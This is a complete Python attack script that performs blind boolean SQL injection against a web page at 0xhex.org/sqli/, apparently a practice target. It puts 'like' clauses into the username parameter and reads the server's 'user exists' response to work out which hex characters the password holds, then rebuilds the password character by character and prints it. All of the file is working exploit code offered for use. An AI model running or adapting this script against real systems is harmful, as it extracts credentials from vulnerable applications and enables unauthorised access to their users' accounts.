import requests


alphanumericChars='1234567890abcdef'
passwordChars=''
targetURL='http://0xhex.org/sqli/'
passString = 'This user exists.<br>'
password=''

def findPassChars(): 
    global passwordChars, targetURL, passString 
    for c in alphanumericChars:
        r = requests.get(targetURL+'/index.php?username=hex"+and+password+like+"%'+c+'%' )
        if passString in r.text:
           passwordChars+= c 
           print ('Password contains character : ' + c)
           
           
           
def findPassword(): 
    global  passwordChars, targetURL, password 
    for i in range(31): 
        for c in passwordChars: 
             r =requests.get(targetURL+'/index.php?username=hex"+and+password+like+"'+ password + c+'%' )
             if passString in r.text: 
                 password += c                
                 print ('Current password evaluation : ' + password) 
             
    
    

          
print("\n \n \nlet's find the Password character\n \n \n ")
findPassChars()
print("\ncharacter password contents : " + passwordChars)
print("\n \n \nNow let's find the Password \n \n \n ")
findPassword()
print("\n \n \nPassword is : " + password)
           



